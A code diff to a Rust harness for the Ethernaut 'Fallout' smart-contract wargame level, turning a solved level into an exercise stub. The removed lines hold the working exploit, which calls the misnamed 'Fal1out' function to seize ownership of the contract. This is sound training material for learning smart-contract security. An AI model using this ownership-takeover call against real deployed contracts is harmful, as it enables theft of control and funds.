@@ -1,6 +1,12 @@
+//! Ethernaut level 02 — Fallout.
+//!
+//! Claim ownership of the contract.
+//!
+//! See the Fallback example (hack01) for how solutions work here.
+
 use async_trait::async_trait;
 use ctf::Actor;
-use ctf::ethernaut::lvl02_fallout::*;
+use ctf::ethernaut::lvl02_fallout::Target;
 
 pub struct Exploit;
 
@@ -13,17 +19,8 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        let contract =
-            Fallout::new(target.address, offender.provider().clone());
-
-        contract
-            .Fal1out()
-            .from(offender.address())
-            .send()
-            .await?
-            .watch()
-            .await?;
-
+        // TODO: exploit the level
+        let _ = (target, offender);
         Ok(())
     }
 }
